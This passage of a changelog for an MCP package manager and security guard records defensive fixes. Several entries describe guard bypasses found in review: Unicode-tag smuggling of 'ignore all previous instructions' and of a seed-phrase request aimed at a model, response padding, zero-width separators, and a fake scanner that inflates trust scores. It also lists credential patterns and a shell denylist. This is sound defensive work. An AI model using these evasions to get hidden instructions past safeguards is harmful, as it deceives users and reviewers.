    registry, so tier 2 in practice never ran. The README, architecture docs, and
    project notes all claimed mcpm "wraps MCP-Scan"; it did not. Trust scores were
    **not** inflated by this — an absent external scanner already drops the
    bucket from `maxPossible` (80 instead of 100) rather than scoring it as a
    failure — so scores you have seen remain valid.
  - Anyone who registered that unclaimed scope would have had mcpm download and
    execute their code on every `mcpm audit`. Fetching and running an unowned
    package name at audit time is the supply-chain shape mcpm exists to flag.

  **mcpm no longer fetches a scanner, at all.** Tier 2 is now opt-in: set
  `MCPM_EXTERNAL_SCANNER` to the path or name of a scanner already installed on
  the machine, which mcpm invokes as `<scanner> --json <server-name>`. When the
  variable is unset — the default — no subprocess is spawned. Package runners and
  shells (`npx`, `pnpx`, `bunx`, `uvx`, `pipx`, `pip`, `npm`, `pnpm`, `yarn`,
  `bun`, `deno`, `docker`, `podman`, `sh`, `bash`, …) are refused by basename,
  insensitive to case, path, and executable or script suffix (`.exe`, `.cmd`,
  `.bat`, `.ps1`, `.js`, `.cjs`, `.mjs`), and including a runner's `-cli`
  entrypoint or a symlink pointing at one. That denylist
  is a regression guard against a pasted `npx …` recipe or a future mcpm default
  drifting back toward one. Be clear on its worth: it is a **footgun guard, not an
  attacker boundary**, since whoever can set this variable can usually set `PATH`
  or drop a file too. The load-bearing changes are that the unowned package name
  is gone and that an unset variable spawns nothing at all.

  Two further hardening steps came out of reviewing the above:

  - **An unverified scanner no longer earns trust points.** Because the variable
    names an arbitrary executable, any binary that merely exits 0 (`/bin/true`)
    would have made the scanner "available", returned no findings, and silently
    banked the full 20-point external bucket — adding 20 to the **raw** score
    that `mcpm install --min-trust` and the MCP `HARD_TRUST_FLOOR` compare
    against. That floor is documented as one no caller-supplied value can lower,
    and an environment variable is caller-supplied. The bucket is now credited
    only when the scanner returns a result mcpm could actually read, and a
    scanner that fails is treated as **absent** (bucket leaves `maxPossible`)
    rather than as a failing scan. Note the honest comparison: that is "no worse
    than having no scanner", not "no change" — if you were scoring against a
    working scanner and it breaks, those points do go away, and a raw
    `--min-trust` gate will see the drop. The gate stops accidental inflation
    (`/bin/true`, a typo, a scanner that broke); it cannot stop someone who
    deliberately points the variable at a script printing `{"findings": []}`,
    because mcpm cannot verify an arbitrary executable did any work.
  - **A misconfigured scanner is no longer silent.** Previously a refused,
    typo'd, or unrunnable command was indistinguishable from having no scanner,
    so the user was told to "set `MCPM_EXTERNAL_SCANNER`" — the variable they had
    just set. mcpm now writes to stderr once per process, both when a value is
    refused and when a configured scanner cannot be run at all. Paths containing
    spaces (`C:\Program Files\…`, `/opt/npm scanner/bin/…`) are accepted rather
    than mistaken for a command line; a pasted `npx some-pkg` is looked up as one
    literal filename, which does not exist, and is reported as unrunnable —
    `execFile` never splits on whitespace, so it is not an argument vector.

  mcpm deliberately does **not** auto-detect a replacement. Invariant Labs'
  mcp-scan is distributed on PyPI (and has been a redirect package for
  `snyk-agent-scan` since 2026-03), never on npm, and its CLI scans client config
  files rather than registry server names — so it is not a drop-in for this
  seam. The unscoped npm `mcp-scan` is an unrelated third-party product. Wiring a
  real scanner is tracked as follow-up work rather than assumed.

- **An unverifiable external scanner can no longer clear the MCP trust floor.**
  Follow-on from the bullet above. The MCP server surface enforces a hard trust
  floor of 25 that no caller-supplied value may lower, protecting the path where
  an AI agent installs with no human in the loop. It compared the **raw** trust
  score — which includes the 20-point external-scanner bucket. Since
  `MCPM_EXTERNAL_SCANNER` names an arbitrary executable, those points are
  caller-supplied too, and the previous release's fix cannot reach the deliberate
  case: mcpm has no way to tell a real clean scan from a two-line script that
  prints `{"findings": []}`. Reproduced end to end — a server with two critical
  static findings and no health check scores 15 and is blocked; with such a
  script configured it scores 35 and `mcpm_up` installed it.

  Both floor gates (`mcpm_install` and `mcpm_up`) now compare mcpm's own
  evidence: health check + static scan + registry metadata, out of 80. The
  exclusion is **one-directional by design** — only the bucket's credit is
  removed, so every penalty an external finding carries outside that bucket
  (chiefly the critical/high cap on registry metadata) still lands. A scanner
  reporting a critical can still push a server *down* through the floor; it can
  no longer push one *up* through it.

  **This is a real behaviour change if you run a genuine external scanner:** its
  20 points stop counting toward that floor, so a server sitting just above 25 on
  scanner credit alone will now be refused on the MCP path. That is the intended
  trade — mcpm cannot distinguish your scanner from the fake one. Your own
  `mcpm install --min-trust` threshold and a stack file's `policy.minTrustScore`
  are deliberately **unchanged**: there the same person picks both the threshold
  and the scanner, so there is no untrusted caller to defend against. Blocked
  installs now report the figure actually compared and why it differs from the
  score shown elsewhere.

- **Unicode TAG-block payloads are now decoded and re-scanned on every carrier.**
  "ASCII smuggling" (arXiv 2607.05744) writes a payload in U+E0000–U+E007F, a
  shadow copy of printable ASCII that renders as nothing but is readable by a
  model. Adding fixtures for it exposed a detection **hole**, not merely a
  false-positive risk: normalization strips TAG characters *before* matching, so
  a fully encoded phrase was **erased** rather than revealed, and hidden-character
  presence detection runs on tool metadata only. On every other carrier such a
  payload scored zero findings — `tool_response`, `tool_call_args`,
  `resource_content`, `prompt_content`, `structuredContent`, and
  `sampling_prompt`.

  The last one is the serious case. `sampling_prompt` is the guard's only
  block-tier path that replies to the server, and it was bypassable: a wallet
  seed-phrase solicitation blocked in plain text and **passed** when TAG-encoded
  behind an innocuous sentence. The exploitable direction is
  `sampling/createMessage`, where the concealed text goes to the *model* — a
  model that decodes tag codepoints reads an instruction no human reviewer can
  see. (For `elicitation/create` the message renders to the user, so a fully
  encoded payload is invisible to the victim too and phishes nobody, unless the
  client normalizes tag characters when rendering.)

  The guard now decodes TAG characters back to ASCII **in place** — keeping the
  surrounding visible text exactly where it is — and re-runs the carrier's own
  signatures, so a concealed payload is judged by what it says: the seed-phrase
  case blocks via `credential-phishing-wallet-solicitation` with the error routed
  back to the server. In place is the load-bearing part. The engine already scans
  a visible-only view (normalization strips tag characters, which catches them
  used as invisible word separators); adding a tag-only view would have created
  two disjoint projections with a gap between them, and
  `"Report done. ig" + TAG("nore all previous instru") + "ctions…"` sits in that
  gap — a complete instruction to any model that decodes tag codepoints, invisible
  to both projections. Decoding in place is the view the model actually reads, so
  an interleaved payload matches while two unrelated tag runs stay unrelated.
  Unlike base64-decoded findings,
  TAG-decoded ones are **not** clamped to warn — base64 is everywhere in benign
  data, which makes a decoded match weak evidence, whereas a tag run decoding to a
  signature-matching phrase is *stronger* evidence than the same phrase in
  plaintext — defensible only because in-place decoding cannot fabricate
  adjacency, so the phrase has to genuinely be there. The two passes also
  compose: base64 wrapping a TAG-encoded payload is caught (at the base64 layer's
  warn tier). Base64-of-base64 still evades, unchanged.

  Two limits are pinned as tests rather than left to be found: a payload buried
  in the discarded middle of a leaf larger than the 64 KB match window is not
  seen (the pre-existing bound, identical for plaintext), and a well-formed
  subdivision flag outside the three RGI sequences warns on a data carrier.

  A third limit was a live bypass, found by the fifth adversarial review round
  on the pull request that added this — after it merged — and closed before
  release. So the decoded pass does not re-report an article that merely *quotes*
  an attack phrase, a decoded finding is dropped when the same finding is visible
  without decoding. That comparison was keyed on the match's **rendered text**,
  and an attacker writes both sides of it: a visible phrase preceded by any
  character outside `[\s.,;:!?]` matched the relaxed pattern without being
  reported itself, and cancelled the concealed payload — `block` became `warn`,
  leaving only the presence floor. It is now an **occurrence count** against a
  masked copy of the segment, so a match whose literals came from concealed text
  always survives, while a visible phrase cancels itself however often it is
  repeated. The bypass never appeared in a published release.

- **Fixed a pre-existing fusion bug on the ordinary matching path.** When a leaf
  exceeds the 64 KB match window the engine keeps a head and a tail and discards
  the middle, joining them with a newline. A newline is `\s`, so the catalog's
  `[\s]*` token separators matched straight through it, and it satisfied the
  `(?:^|[\s.,;:!?])` anchor — donating a word boundary the text never had. A
  135 KB benign document with a solicitation verb near the head cut and a
  credential noun near the tail start was hard-blocked with an error returned to
  the server, on a phrase 70 KB of unrelated content separates. This affects
  every leaf, not just concealed ones, and it is why the tag work found it: the
  un-clamped tag severity rests on the claim that a matched phrase is genuinely
  present. The join is now 48 NULs — matched by neither `[\s]*` nor the anchor
  class, and longer than the widest bounded bridge in the catalog
  (`[\s\S]{0,40}`).

  A new `unicode-tag-concealment` signature (`high` → warn) is the floor beneath
  that, for a payload concealed but matching nothing. It is scoped to the carriers
  the metadata detector skips, and is the one part of the hidden-character class
  safe to scan in retrieved data: outside an emoji subdivision flag, tag
  characters do not occur in real text. Catalog is 13 entries.

- **Fixed a live false positive: emoji subdivision flags in tool metadata.** 🏴󠁧󠁢󠁳󠁣󠁴󠁿
  is built from tag characters, so any server whose description carried an
  England, Scotland, or Wales flag raised a tool-poisoning warning on every
  `tools/list`. The carve-out validates the **whole sequence** and accepts only
  the three sequences a client actually renders (`gbeng`, `gbsct`, `gbwls`). Both
  properties are load-bearing: a per-character flank test — the shape of the
  existing zero-width-joiner carve-out — would let an attacker write 🏴 followed
  by a tag-encoded payload and suppress detection wholesale, and a shape-based
  whole-sequence rule is barely better, since a chained payload is spelled in
  exactly the shape a real subdivision code has. Nothing legitimate is lost: a
  non-RGI sequence renders as a bare black banner. The emoji presentation
  selector (U+FE0F) is accepted between the base and the body, since writing the
  same flag that way is legitimate and previously warned.

  Benign emoji-tag-sequence fixtures were **added first**. Without them the
  zero-FP claim would have been vacuous — no other fixture in the BENIGN corpus
  contains a codepoint in U+E0000–U+E007F, so a tag-block detector would have
  scored zero false positives against it by construction rather than by merit.
  That corpus is still thin: it covers the carve-out's happy path, not the
  detector's full false-positive surface.

### Fixed

- **`mcpm_install` no longer leaves a live server behind a reported failure.** The
  MCP tool wrote each client's config inside the same loop that validated it, so a
  failure partway through kept every write already made. `resolveInstallEntry`'s
  URL rule is **cursor-only**, which made this reachable with no I/O error at all:
  a server carrying both an npm package and an HTTP remote installed cleanly on
  Claude Desktop, then hit the H9 unguarded-transport hard-deny on Cursor. The
  agent was told the install failed while a live execution surface sat in Claude
  Desktop — and because `addToStore` runs only after the loop, mcpm had **no record
  of it**: invisible to `mcpm list` and `mcpm audit`, and untouched by `mcpm remove`.

  Install is now a unit. Every client's entry is resolved and validated **before**
  any config is written, so the H9 deny installs to none. Any later failure — a
  client write or the store write — rolls back every write already made; the store
  write is inside the transaction because configs without a store record are exactly
  the untracked state above. If rollback itself fails, the error names the clients
  the server is **still installed in** rather than reporting a clean failure.

- **`mcpm lock` no longer writes a truncated lock, and `mcpm verify` no longer
  passes over one.** Two independent fail-opens formed one chain: `lock` wrote
  the lock file *before* its error branch (which only printed), so a run where
  every server failed to resolve emitted `Locked 0 servers`, left `servers: {}`
  on disk, and exited **0**. `verify` then reported
  `✓ 0 npm servers verified`, `"ok": true`, and also exited **0** — because the
  integrity and provenance gates both pass *vacuously* over an empty server set.
  A CI pipeline running `mcpm lock && mcpm verify` got a green tick and a printed
  checkmark having verified nothing at all.

  This turned the F8 provenance gate off silently: a lock written while a server
  was unresolvable, or while Sigstore was unloadable, carries no `verification:`
  block, and `verify` is evidence-gated — no baseline, nothing to re-check, pass.

  Fixing either side alone leaves the hole open, so both are fixed:

  - `lock` is now **all-or-nothing**. It still resolves every server and reports
    every failure (one bad entry does not mask the others), then writes nothing
    and exits non-zero, leaving any previous lock intact.
  - `verify` gained a **coverage** gate: servers `mcpm.yaml` declares but the lock
    omits are reported and fail the run. This catches a lock truncated by an older
    release, a hand-edit, or a bad merge — cases where every other gate is green
    because they read only the lock. With no `mcpm.yaml` present, coverage is
    skipped (`verify` remains lock-first); a *malformed* one fails closed rather
    than silently disabling the check.
  - A lock containing **no servers** never passes unless an `mcpm.yaml` confirms
    nothing was declared, and `verify` no longer prints `✓ 0 ... verified` — a
    checkmark over an empty set is what made the fail-open look healthy.

### Changed

- **BREAKING for CI consumers of exit codes.** `mcpm lock` now exits non-zero when
  any server fails to resolve (previously 0 with a partial lock). `mcpm verify`
  now exits non-zero on an uncovered or empty lock (previously 0). Both changes
  turn a silent green into a visible red; a pipeline that was passing because of
  the bug will start failing, which is the point.
- `mcpm up`'s first-run auto-lock now aborts instead of installing a subset when
  a declared server cannot be resolved. Only the no-lock-yet path is affected — an
  existing lock is used exactly as before.
- `VerifyModel` gained `uncovered: string[]` and `vacuous: boolean` (`--json`
  shape remains explicitly UNSTABLE).
- Trust-score output now points at `MCPM_EXTERNAL_SCANNER` where it previously
  said "install mcp-scan", in `mcpm install` and `mcpm why`.
- Documentation refreshed against 2026 evidence: the NSA AI Security Center's MCP
  guidance, OX Security's finding that a proof-of-concept poisoned server was
  accepted by 9 of 11 public registries, Microsoft's tool-poisoning advisory, and
  the SmartLoader trojanized-server campaign now back the claims the README makes
  about why a guard exists.

## [0.27.0] - 2026-07-27

### Fixed

- **`mcpm guard inspect` and the relay now return the same verdict** — 3 of the
  12 catalog signatures were unreachable through the public scoring seam.
  `inspect` shipped in v0.25.0 calling `inspectMessage` alone, while the relay
  composes three stateless detectors, so `exfil-param-in-schema`,
  `credential-phishing-wallet-solicitation` and
  `credential-phishing-financial-solicitation` returned
  `{"action":"pass","findings":[]}` with exit 0 on frames the relay blocks as
  critical — while `guard list-signatures` advertised all three as installed.

  The gap was self-concealing: `mcptox.test.ts` evaluated fixtures through the
  same incomplete pipeline, so a fixture for any of these signatures would have
  failed the release gate, and `mcp-guardbench` extracts its corpus from that
  directory — so the guard, its test suite, and the published benchmark were all
  blind in the same place at once.

  Fixed with one shared composition, `inspectFrame` in the new
  `src/guard/inspect-frame.ts`, consumed by the relay, `guard inspect`, and the
  fixture release-gate alike. Schema/handshake drift and policy overrides stay
  in the relay: they need relay state, so they are not properties of a frame.

  **Relay enforcement is unchanged** — this only affects the offline advisory
  and scoring surface. No runtime protection was missing.

### Changed

- **BREAKING for verdict consumers (why this is a minor, not a patch):** frames
  that previously reported `pass` now report `block`, and `guard inspect`'s exit
  code changes from 0 to 2 for them. Anyone gating CI on `guard inspect` over
  captured traffic will see new — correct — failures. External adapters depend
  on this seam, including `mcp-guardbench`.

### Added

- Fixtures for all three previously-unrepresented signatures, and
  `inspect-relay-parity.test.ts`, which pins two invariants: every attack/warn
  fixture must be non-`pass` **through the public CLI entry point** (black-box,
  not a hand-composed mirror of the relay that could drift identically), and
  every catalog signature must have at least one fixture.

## [0.26.3] - 2026-07-26

### Fixed

- **MCP tool input schemas are now strict on the wire** (security issue #31).
  The schemas in `server/tools.ts` were already `z.strictObject`, but they were
  handed to `registerTool` as `.shape` — and a raw shape is rebuilt internally
  as a plain `z.object(shape)`, which drops the object-level `strict` setting.
  Per-field bounds and the client enum survived that rebuild; strictness did
  not. Unknown arguments were therefore silently dropped, and `tools/list`
  advertised no `additionalProperties: false`.

  Every tool now passes its whole schema, so an unknown argument returns a
  JSON-RPC `-32602 unrecognized_keys` error and the advertised schema states the
  contract. `mcpm_audit` and `mcpm_doctor` declared no input schema at all —
  meaning for tools that accept nothing, *every* argument was ignored — and now
  use a shared empty strict schema.

  Behaviour for well-formed calls is unchanged.

## [0.26.2] - 2026-07-25

Dependency and asset maintenance. No behavior change.

### Changed

- **`@sigstore/verify` 3.1.1 → 4.1.0 and `@sigstore/bundle` 4.0.0 → 5.0.0**
  (`@sigstore/core` → 4.0.1). These are majors on the F8 crypto verification
  path, so they were validated against **live npm attestations** rather than on
  fixture-based CI alone — the suite verifies against fixtures, and a semantic
  change there could pass every test while silently breaking real attestation
  checking. Confirmed `outcome=verified` with the correct Fulcio SAN and issuer
  on two published versions, with real registry `dist.integrity` fetched so the
  sha512 subject binding is genuinely exercised.
- `ossf/scorecard-action` 2.4.3 → 2.4.4, `actions/checkout` 7.0.0 → 7.0.1.
- Banner artwork version string bumped (it had gone six releases stale).

## [0.26.1] - 2026-07-25

### Fixed

- **`mcpm guard mute guard-inspection-truncated` now works.** v0.26.0's new
  truncation finding pointed users at that command in its remediation text, but
  `mute` deliberately refuses signature ids outside the catalog (so a typo can't
  silently mute nothing) and the id had never been registered — the documented
  escape hatch failed with `Unknown signature id`. It is now an empty-patterns
  catalog entry, the same convention `exfil-param-in-schema` and
  `hidden-chars-in-metadata` use. Detection is unchanged; the id is simply
  recognized by `guard mute`, `guard list-signatures`, and policy overrides.

### Documentation

- `docs/GUARD.md` documents `mcpm guard inspect` (missing since v0.25.0) and
  budget truncation under Limits.
- `docs/SIGNATURES.md` catalog count corrected (it disagreed with what
  `guard list-signatures` actually prints) and both pattern-less entries
  documented.
- The README's GitHub Action snippet was pinned six releases behind, and the
  ROADMAP headers still declared v0.19.0 current.
- README now leads with the guard rather than the package manager, and points at
  [mcp-guardbench](https://github.com/getmcpm/mcp-guardbench) — noting the
  100%/0% score is by construction, since the corpus is mcpm's own fixtures.

## [0.26.0] - 2026-07-25

Security. Closes a **detection bypass in the guard engine** and a JSON output
framing flaw. Both were found by an adversarial review pass and independently
reproduced. **Upgrade if you use `mcpm guard`.**

### Fixed

- **Leaf-walk budget exhaustion failed open — a full detection bypass.**
  `stringLeaves` caps its walk at 100,000 nodes to bound work and avoid stack
  exhaustion. On reaching that ceiling it returned silently, so every leaf past
  the budget went **uninspected** and the frame reported `pass`. Padding a
  `tools/list` with 25,001 junk elements — 73 KB on the wire — hid a critical
  tool-description injection completely. This applied to the **live relay**, not
  only to `mcpm guard inspect`, so any malicious or compromised MCP server could
  pad its responses and be reported clean.

  Exhaustion now produces a `guard-inspection-truncated` finding on the affected
  carrier, at `critical` severity so it rides the existing carrier policy: it
  **blocks** on block-capable carriers (where an uninspected payload would reach
  the model before invocation) and clamps to **warn** on retrieved-data carriers
  (where blocking would corrupt the document the user asked to read). The guard
  no longer reports "clean" for a frame it did not finish reading.

  False-positive risk is negligible and was measured, not assumed: the largest
  frame in the 38-case benign+attack corpus is 40 nodes against a 100,000
  budget. The corpus scores identically after the change.

  The prior regression test buried a *benign* leaf past the budget and asserted
  `pass`, so it passed for the wrong reason and certified the blind spot. It now
  asserts that truncation is reported.

- **`guard inspect --json` could emit one verdict as two lines.** `JSON.stringify`
  does not escape U+2028/U+2029, but Node's `readline` — how the documented
  consumer splits this stream — treats them as line terminators. One inside an
  attacker-controlled excerpt split a verdict across two lines and desynced every
  following frame for any consumer correlating positionally. Reproduced end to
  end: it forged a `pass` on a real attack and a `block` on a benign case. C1
  controls (U+0080–U+009F) were also emitted raw and drive a terminal with no ESC
  byte at all, reachable even through the parse-error path, which needs no
  signature to match.

  Both are now escaped at the emit boundary. Escaping is lossless — `JSON.parse`
  returns the identical string — so excerpts keep byte-fidelity.

## [0.25.0] - 2026-07-25

`mcpm guard inspect` — offline frame verdicts, and the public seam an external
benchmark needs to score the guard fairly.

### Added

- **`mcpm guard inspect [file]`** — run the shipped signature catalog over MCP
  JSON-RPC frame(s) with no relay, no wrapped server, and no network. Takes a
  file argument or stdin (`-`), and accepts either one JSON frame
  (pretty-printed is fine) or NDJSON with one frame per line.

  ```bash
  mcpm guard inspect suspicious-response.json     # human-readable
  cat frames.ndjson | mcpm guard inspect --json   # one verdict line per frame
  ```

  Exit status makes it usable as a CI gate over captured traffic: `2` if
  anything would be blocked, `1` if anything warns (or a frame would not parse),
  `0` if every frame passes.

  Verdicts are the same default actions the relay applies, **including the
  warn-only carrier clamp** — an injection in a `resources/read` body reports
  `warn` here exactly as it would inline. Local policy overrides (mutes,
  `log_only`) are deliberately *not* applied: the command answers "what do the
  signatures see", not "what would this machine's config do".

  `--json` emits exactly one verdict per input frame **in input order**, and an
  unparseable or non-object frame yields an explicit `{"action":"error"}` rather
  than being skipped — so a harness can tell "the guard says this is safe" apart
  from "the guard fell over", and can correlate verdicts to its own case ids
  positionally.

  **Why this is a published command.** An external benchmark has to be able to
  ask what mcpm's guard says about a frame without importing `src/guard/*`.
  Lacking that seam, a harness must vendor a bundle of the engine — which
  silently drifts from what ships, and hands mcpm an in-process path no other
  guard being scored can have. Both quietly invalidate the comparison. With this
  command, every guard — mcpm included — is measured through its own published
  CLI.

## [0.24.0] - 2026-07-23

Verify-time Sigstore provenance enforcement (F8 "B3" — the enforcing gate).

### Added

- **`mcpm verify` and `mcpm up --frozen` now re-verify provenance and fail closed.**
  Where the crypto slice (v0.23.0) *reported* provenance, these commands now
  **enforce** it: for every npm server whose lock recorded a cryptographically
  `verified` baseline, the gate re-runs the offline crypto verification against
  npm's **current** published record and blocks on a regression —
  - `signer-changed` — still verifies, but under a different (unforgeable) signer
    identity than the lock recorded (an attestation swap),
  - `regression` — was verified; now the attestation fails to verify or is gone,
  - `unverifiable` — couldn't cryptographically re-verify this run (re-run).

  The gate is **evidence-gated**: only servers with a `verified` baseline are
  checked, so a lock with none — every pre-crypto lock and the overwhelmingly
  unsigned MCP ecosystem — is unaffected. `mcpm verify` reports the provenance
  dimension in its text and `--json` model; `up --frozen` runs the integrity +
  provenance freeze before installing anything.

### Changed

- `mcpm lock` keeps a crypto-`verified` baseline **sticky** across a re-lock whose
  fresh read is transient or no longer verifies (for the same immutable
  coordinate), so a network blip can't silently disarm the verify-time gate; it
  warns loudly on a genuine verification regression or downgrade.
- Honest boundary unchanged: a block means npm's **published record** diverged from
  your lock — not that mcpm inspected the bytes your agent runs at launch.

## [0.23.0] - 2026-07-20

Offline cryptographic verification of npm provenance (F8 crypto slice).

### Added

- **Offline Sigstore verification of npm provenance** — `mcpm lock` and `mcpm why`
  now cryptographically verify a package's SLSA provenance **offline**: the
  attestation's Sigstore bundle is checked against a vendored, authenticity-verified
  trust root (no Rekor/Fulcio network call — the bundle inlines the transparency-log
  entry and certificate chain). A record reads `verified` only when **all** hold:
  the signature + Fulcio chain + SCT + Rekor inclusion verify, the signer's OIDC
  issuer is GitHub Actions, and the attested subject digest binds to **every**
  `sha512` entry of the package's `dist.integrity` (so a valid attestation for a
  *different* tarball cannot pass). The reported build identity is derived from the
  unforgeable signing certificate, not the self-claimed payload.

  Uses three focused `@sigstore` packages (verify / bundle / protobuf-specs; no
  foreign transitive dependencies) and raises the Node floor to `>=22.9.0`.
  **Report-only**, and honest about scope: `verified` means the *build identity* is
  cryptographically attested by the CI's OIDC token — **not** that the code is safe.
  The `mcpm why` Provenance section now renders this verdict.

### Changed

- Removed ~871 lines of dead code and duplication across the repo (two unused
  modules, several unused functions/fields, and behavior-identical consolidations),
  and fixed a bug the cleanup surfaced: `mcpm list` had silently omitted the
  Claude Code and Gemini CLI clients.

### CI

- The release pipeline now **dogfoods the packed artifact before publishing**:
  it packs the tarball, installs it into a clean project, and smoke-runs the real
  `mcpm` binary — failing the release *before* publish if the shipped bytes are
  broken (so a bad `bin`, an unresolved dependency, an engines mismatch, or an
  un-bundled asset can never reach npm).

## [0.22.0] - 2026-07-18

`mcpm lock` gains npm provenance-identity drift detection (F8 · slice 1).

### Added

- **npm provenance-identity drift tripwire** — `mcpm lock` now records each npm
  server's published Sigstore attestation identity (source repo + the immutable
  numeric GitHub repository/owner ids + workflow + commit) into the lockfile and
  WARNs when it drifts across versions: a repo/owner change or a signed→unsigned
  drop — the shape of a hijacked-publish (Postmark) attack, which schema-pinning
  structurally cannot see.

  It is **parse-only and report-only**, with **zero new dependencies**: it parses
  npm's published attestation record (JSON + base64, no cryptographic verification)
  over TLS from a hard-coded host — the same anchor the `dist.integrity` tripwire
  already trusts. It **never blocks the lock** and never changes exit codes.

  **Honesty boundary:** `attested` means an *unverified registry record* — build
  **identity, not safety**. This slice never reports "verified"; cryptographic
  Sigstore verification (which would add dependencies) is a separate, opt-in
  follow-up. It cannot catch a same-repo CI compromise that produces a valid
  attestation with an unchanged identity.

  Drift comparison is tiered on the immutable numeric ids so a legitimate repo
  rename (stable id, changed URL) is not a false positive, and a transient fetch
  failure carries the last known-good baseline forward rather than silently
  disarming the tripwire.

## [0.21.0] - 2026-07-16

`mcpm doctor` now surfaces plaintext secrets pasted into client config (F9 · PR1).

### Added

- **`doctor` plaintext-secret scan** — `mcpm doctor` scans installed servers' `env`
  and `header` values for plaintext secrets and reports them as a read-only advisory,
  so you can move them into the encrypted store (`mcpm secrets` / `--secrets keychain`).
  Two detectors: known-format credential shapes (AWS / GitHub — including fine-grained
  `github_pat_` — / OpenAI / Stripe / Slack / … keys), and a secret-named-key heuristic
  for generic passwords/tokens, gated by a benign corpus to hold the zero-false-positive
  line. Findings report the **key name and a label only — never the value**, and values
  already stored as `mcpm:keychain:` placeholders are skipped. The advisory flows to the
  text output, `--json`, `--report` (a count only — no names), and the MCP `doctor` tool.
  It is **advisory and non-gating**: it never changes `doctor`'s exit code.

  Known false-positive-safe by design: templated references (`Bearer ${input:key}`,
  `%VAR%`), secret-manager URIs (`op://`, `vault://`), and file paths (POSIX + Windows)
  are excluded. Known deferred gaps (documented): the login-shell PATH probe and `--fix`
  mutators (F9 PR2–PR4), inline connection-string credentials, and credential-carrying
  URIs such as `otpauth://…?secret=`.

## [0.20.1] - 2026-07-16

A patch closing the three follow-ups flagged during the v0.20.0 security review
(#131). No API changes.

### Fixed

- **guard/relay — the 64 MB buffer-cap teardown no longer crash-loops the guard.**
  When a wrapped server exceeded the unframed-input cap, the relay called
  `source.destroy(new Error(...))`; the source (`child.stdout`) has no `'error'`
  listener, so that re-emitted as an uncaughtException and crash-looped the guard —
  the same vector the v0.20.0 review fixed at the four `readMessage()` sites but left
  on the buffer-cap branch. It is now a no-arg `destroy()`, matching the
  malformed-frame teardown; the DoS `block` event is still emitted.

### Security

- **registry — free-text response fields are now length-bounded.** The v0.20.0 ReDoS
  fix bounded per-regex cost; these Zod `.max()` ceilings (1 KB identifiers / 8 KB
  URLs / 64 KB free text) bound the input length itself at the untrusted registry
  boundary. Ceilings are deliberately generous — `safeParse` drops the whole page on
  a single over-ceiling field, so they deny only multi-MB DoS payloads and never clip
  legitimate data; `icon.src` is intentionally left uncapped (it may be a large
  `data:` URI and is never scanned or rendered).
- **guard/confine — a drift-guard test locks the secret-dir read-denylist to the
  supported client set.** The denylist is hand-maintained and had silently drifted
  behind two clients before the review caught it; a new test walks every supported
  client's config path and fails the build if one is not covered by a denied segment,
  so the denylist can no longer rot behind a newly-added client adapter.

## [0.20.0] - 2026-07-14

Response-side credential DLP lands (**F10 Detector-A + B**) and a full adversarial
security review hardens the guard, scanner, relay, and confine sandbox. The guard now
warns-and-redacts on credentials egressing in tool responses (including base64-encoded
ones), and six independently-verified findings — from a zero-width-separator signature
bypass to an O(n²) scanner ReDoS — are fixed.

### Added

- **F10 Detector-A — response-side credential DLP** — a 10th catalog signature,
  `credential-egress-in-response` (WARN-tier), flags a high-confidence **structural**
  credential returned in a `tool_response`: PEM private-key blocks, `gh[pousr]_` /
  `github_pat_` (GitHub), `glpat-` (GitLab), `sk-` / `sk-ant-` / `sk-proj-` (OpenAI/
  Anthropic), `[sr]k_(live|test)_` (Stripe), `xox[baprs]-` (Slack), `npm_`, `AIza`
  (Google), and `AKIA…` (AWS, excluding the documented example key). Warn — not block —
  because a secrets-manager/auth tool legitimately returns credentials; the caught
  secret is **redacted** to `‹redacted N-char secret›` so it never reaches the warning
  message or `guard-events.jsonl`.
- **F10 Detector-B — decode-and-rescan** — the guard now decodes base64 / base64url
  runs inside server-returned data (`tool_response`, `resource_content`,
  `prompt_content`) and re-runs the signatures on the decoded text, closing the
  encoding-evasion gap where a server base64-wraps an injection or credential to slip
  past the regex floor. Decoded findings are **WARN-clamped** (strictly additive — a
  decoded match can never block on its own), gated by a printable-ratio "texty" test
  and the anchored-signature set to preserve the zero-false-positive contract.

### Security

Fixes from an adversarially-verified multi-lens review (each finding refute-tested
before it counted):

- **guard/signatures — zero-width-separator bypass of the instruction-injection family
  (HIGH).** `PATTERN_BREAKERS` strips a zero-width space *before* matching, so
  `ignore<U+200B>previous instructions` collapsed to adjacency and the `[\s]+`
  (≥1 whitespace) separator failed to match → the frame passed. Internal separators are
  now `[\s]*` across all five injection targets (parity with the credential family's
  existing `[\s-]*` fix).
- **guard/confine — read-denylist omitted Claude Code and Gemini CLI configs (HIGH).**
  A confined server could read `~/.claude.json` / `~/.gemini` — which hold sibling
  servers' plaintext `env` credentials — under the sandbox's `(allow default)` read
  posture. Both are now in the secret-directory denylist (all six clients covered).
- **guard/patterns — deep-nesting inspection blind spot (MEDIUM).** The leaf walk's
  depth cap silently dropped an injection buried >32 levels deep in `structuredContent`.
  Replaced the recursive depth-cap with an iterative, node-budget-bounded walk — closes
  the blind spot and the recursion stack-overflow risk in one change.
- **scanner — O(n²) ReDoS in the base64 pattern (MEDIUM).** A long unpadded
  base64-alphabet run in attacker-controlled registry metadata made `search`/`audit`
  backtrack ~2.5 s per 32 KB field. Bounded the quantifier (`{40,512}`) — padding stays
  required, so nothing new matches on benign input.
- **relay — malformed frame crashed the guard (LOW).** A non-JSON-RPC line on the
  wrapped server's stdout (e.g. a startup banner) became an uncaught exception and
  crash-looped the relay. All frame-read sites now fail closed: emit a RELAY
  `malformed-frame` block event and tear down the source, forwarding nothing.
- **search/info — terminal escape injection via registry free-text (LOW).**
  Registry-controlled `description` / `title` / `repository.url` / `websiteUrl` reached
  the terminal without stripping ANSI/OSC/control chars (link/window-title/line-overwrite
  spoofing). The human-render branches now route through `sanitizeForTerminal`; `--json`
  output stays byte-faithful.

### Fixed

- **Two Tier-1 scanner false-positive classes** surfaced by a full-registry sweep — the
  "Bearer" credential phrase and the "system prompt" injection pattern no longer fire on
  benign prose (structural/verb-anchored patterns; regression-tested).

### Documentation

- **`docs/VISION.md`** — the strategy layer (thesis, trust flywheel, horizons with exit
  metrics, the "never" doctrine), cross-linked from the roadmap and README.

### Dependencies

- `ora` 9.4.0 → 9.4.1, `ossf/scorecard-action` bump, and the dev-dependency group
  (`vitest` / `@vitest/coverage-v8` 4.1.9 → 4.1.10, `@types/node` patch).

## [0.19.0] - 2026-07-03

